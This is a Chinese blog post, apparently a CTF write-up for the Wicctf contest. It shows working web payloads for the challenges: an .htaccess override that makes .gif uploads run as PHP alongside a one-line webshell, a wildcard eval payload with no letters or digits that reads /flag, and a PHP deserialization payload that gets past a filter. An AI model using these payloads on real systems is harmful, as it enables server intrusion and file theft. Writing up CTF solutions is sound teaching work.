@@ -1,0 +1,626 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/L.jpg">
+  <link rel="icon" type="image/png" href="/img/L.jpg">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#FFFFF2">
+  <meta name="description" content="BLOG">
+  <meta name="author" content="">
+  <meta name="keywords" content="">
+  <title>Wicctf - 1__/\/のblog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/arduino-light.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/shubiao.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/gundongtiao.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/toubudaziji.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"lll-nnn.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"❡"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="1__/\/のblog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 100vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>1__/\/</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/0008.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Wicctf">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-05-11 17:00" pubdate>
+        2021年5月11日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      790 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      24
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+            <div class="scroll-down-bar">
+              <i class="iconfont icon-arrowdown"></i>
+            </div>
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Wicctf</h1>
+            
+            <div class="markdown-body">
+              <h2 id="UploadHub"><a href="#UploadHub" class="headerlink" title="UploadHub"></a>UploadHub</h2><p>文件上传题<br>给了源码，其中有些配置文件看不懂，放弃了   </p>
+<p><img src="https://ftp.bmp.ovh/imgs/2021/05/7f3a08ef5c52084e.png" srcset="/img/loading.gif">     </p>
+<p>一开始上传PHP文件，上传成功了，但访问返回了文件中的内容，应该是没有解析PHP文件     </p>
+<p>这时候就应该找apache中的相关配置了    </p>
+<p><img src="https://ftp.bmp.ovh/imgs/2021/05/ba7dc9869ba2aa96.png" srcset="/img/loading.gif">      </p>
+<p>这个设为了<code>off</code>会限制目录下的PHP文件没有执行权限<br><img src="https://ftp.bmp.ovh/imgs/2021/05/248d2e75b77fddd4.png" srcset="/img/loading.gif">        </p>
+<p>通过传入<code>.htaccess</code>文件来覆盖配置文件中的设置（<code>.htaccess</code>文件作用所在的目录和所有子目录，指令按查找顺序依次生效，所以子目录下的<code>.htaccess</code>可能会覆盖父目录下或者配置文件中的指令）      </p>
+<div class="hljs"><pre><code>&lt;Files &quot;*.gif&quot;&gt;
+ForceType application/x-httpd-php
+SetHandler application/x-httpd-php
+php_flag engine on
+&lt;/Files&gt;</code></pre></div>
+<p><code>&lt;file&gt;</code>标签比<code>&lt;directory&gt;</code>优先级高     </p>
+<p>然后上传一句话木马，文件后缀名改为<code>.gif</code>      </p>
+<p>蚁剑连上也没用，有<code>disable_function</code>,访问一句话文件<code>var_dump(file_get_contents(&#39;/flag&#39;));</code>可以<img src="https://ftp.bmp.ovh/imgs/2021/05/4364ac2b513673d6.png" srcset="/img/loading.gif">        </p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8267">Apache的.htaccess利用技巧</a>    </p>
+<h2 id="hate-php"><a href="#hate-php" class="headerlink" title="hate_php"></a>hate_php</h2><p>php代码审计   </p>
+<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+error_reporting(<span class="hljs-number">0</span>);
+<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;
+    highlight_file(<span class="hljs-keyword">__FILE__</span>);
+&#125;<span class="hljs-keyword">else</span>&#123;
+    $code = $_GET[<span class="hljs-string">&#x27;code&#x27;</span>];
+    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/[A-Za-z0-9_$@]+/&quot;</span>,$code))&#123;
+        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fighting!&#x27;</span>); 
+    &#125;
+    <span class="hljs-keyword">eval</span>($code);
+&#125;</code></pre></div></code></pre>
+<p>过滤了字母数字还有<code>_@$</code>    </p>
+<p>试了下异或，不行；url取反也不行，就没招了…….      </p>
+<p><code>通配符</code><br><code>/bin/cat /flag</code>——-&gt;<code>/???/??? /????</code>    </p>
+<p>payload:<code>code=?&gt;&lt;?=`/???/??? /????`;?&gt;</code>   </p>
+<p><img src="https://ftp.bmp.ovh/imgs/2021/05/c411a626c7ac6ef0.png" srcset="/img/loading.gif">    </p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=1#reply-list">无字母数字webshell之提高篇—P神</a></p>
+<h2 id="power-cut"><a href="#power-cut" class="headerlink" title="power_cut"></a>power_cut</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/05/e826621caaab1102.png" srcset="/img/loading.gif">       </p>
+<p>停电了会发生什么    </p>
+<p>未完成的文件，提示<code>swp</code>泄露，当时看到这句话没啥感觉，找了找其他也没啥，就去扫目录了      </p>
+<p>扫到<code>.index.php.swp</code>       </p>
+<p>swp文件拖到Linux回复一下<code>vi -r .index.php.swp</code>      </p>
+<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">logger</span></span>&#123;
+    <span class="hljs-keyword">public</span> $logFile;
+    <span class="hljs-keyword">public</span> $initMsg;
+    <span class="hljs-keyword">public</span> $exitMsg;
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$file</span>)</span>&#123;
+        <span class="hljs-comment">// initialise variables</span>
+        <span class="hljs-keyword">$this</span>-&gt;initMsg=<span class="hljs-string">&quot;#--session started--#\n&quot;</span>;
+        <span class="hljs-keyword">$this</span>-&gt;exitMsg=<span class="hljs-string">&quot;#--session end--#\n&quot;</span>;
+        <span class="hljs-keyword">$this</span>-&gt;logFile =  $file;
+        readfile(<span class="hljs-keyword">$this</span>-&gt;logFile);
+        
+    &#125;
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params">$msg</span>)</span>&#123;
+        $fd=fopen(<span class="hljs-keyword">$this</span>-&gt;logFile,<span class="hljs-string">&quot;a+&quot;</span>);
+        fwrite($fd,$msg.<span class="hljs-string">&quot;\n&quot;</span>);
+        fclose($fd);
+    &#125;
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;this is destruct&quot;</span>;
+    &#125;
+&#125;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">weblog</span> </span>&#123;
+    <span class="hljs-keyword">public</span> $weblogfile;
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;
+        $flag=<span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;)&quot;</span>;
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$flag</span>&quot;</span>;
+    &#125;
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;
+        <span class="hljs-comment">// self::waf($this-&gt;filepath);</span>
+        $obj = <span class="hljs-keyword">new</span> logger(<span class="hljs-keyword">$this</span>-&gt;weblogfile);
+    &#125;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params">$str</span>)</span>&#123;
+        $str=preg_replace(<span class="hljs-string">&quot;/[&lt;&gt;*#&#x27;|?\n ]/&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$str);
+        $str=str_replace(<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,$str);
+        <span class="hljs-keyword">return</span> $str;
+    &#125;
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;this is destruct&quot;</span>;
+    &#125;
+
+&#125;
+
+$log = $_GET[<span class="hljs-string">&#x27;log&#x27;</span>];
+$log = preg_replace(<span class="hljs-string">&quot;/[&lt;&gt;*#&#x27;|?\n ]/&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$log);
+$log = str_replace(<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,$log);
+$log_unser = unserialize($log);
+
+<span class="hljs-meta">?&gt;</span>
+
+&lt;html&gt;
+&lt;body&gt;
+&lt;p&gt;&lt;br/&gt;昨天晚上因为<span class="hljs-number">14</span>级大风停电了.&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre></div></code></pre>
+<p><code>readfile</code>  、 flag在<code>/flag</code>      </p>
+<p>链<code>new weblog--&gt;wakeup--&gt;logger--&gt;__construct</code>只要将<code>$weblogfile=&#39;/flag&#39;</code>即可       </p>
+<p>flag过滤了，双写即可绕过    </p>
+<div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">logger</span></span>
+<span class="hljs-class"></span>&#123;
+    <span class="hljs-keyword">public</span> $logFile;
+    <span class="hljs-keyword">public</span> $initMsg;
+    <span class="hljs-keyword">public</span> $exitMsg;
+&#125;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">weblog</span> </span>
+<span class="hljs-class"></span>&#123;
+    <span class="hljs-keyword">public</span> $weblogfile=<span class="hljs-string">&#x27;/flag&#x27;</span>;
+&#125;
+$a=<span class="hljs-keyword">new</span> weblog();
+<span class="hljs-keyword">echo</span> serialize($a);</code></pre></div></code></pre>
+<p>payload：<code>?log=O:6:&quot;weblog&quot;:1:&#123;s:10:&quot;weblogfile&quot;;s:5:&quot;/flflagag&quot;;&#125;</code></p>
+<p><img src="https://ftp.bmp.ovh/imgs/2021/05/c6d9e931038e0740.png" srcset="/img/loading.gif">      </p>
+<h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><div class="hljs"><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+highlight_file(<span class="hljs-keyword">__FILE__</span>);
+    session_start();
+    $url = $_GET[<span class="hljs-string">&#x27;url&#x27;</span>] ?? <span class="hljs-literal">false</span>;
+    <span class="hljs-keyword">if</span>($url)
+    &#123;
+    $a = preg_match(<span class="hljs-string">&quot;/file|dict/i&quot;</span>, $url);
+        <span class="hljs-keyword">if</span> ($a==<span class="hljs-number">1</span>)
+        &#123;
+            <span class="hljs-keyword">exit</span>();
+        &#125;
+
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, $_GET[<span class="hljs-string">&quot;url&quot;</span>]);
+            curl_setopt($ch, CURLOPT_HEADER, <span class="hljs-number">0</span>);
+            curl_exec($ch);
+            curl_close($ch);
+    &#125;
+
+<span class="hljs-meta">?&gt;</span></code></pre></div></code></pre>
+<p>SSRF    </p>
+<p><code>利用gopher协议攻击已知用户名无密码的Mysql</code>  </p>
+<p>算了，环境也关了，附上<br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/j-M7gfVXdnxovWDiZGTihQ">宸极实验室的WP</a>    </p>
+<p>还有一道GO语言的题…….完全不懂…..</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/wicctf/">wicctf</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
+                    
+                      <a class="hover-with-bg" href="/tags/WP/">WP</a>
+                    
+                      <a class="hover-with-bg" href="/tags/wicctf/">wicctf</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/05/15/BUU86/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">不是文件上传</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/05/10/BUU85/">
+                        <span class="hidden-mobile">StrongestMind</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/qipao.js"></script>
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/caidai.js"></script>
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/yinghua.js"></script>
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/boom.js"></script>
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+<!--//背景线条      {% if theme.canvas_nest %}-->
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+{% endif %}
+
+<!-- fireworks-->
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
+
+</body>
+</html>
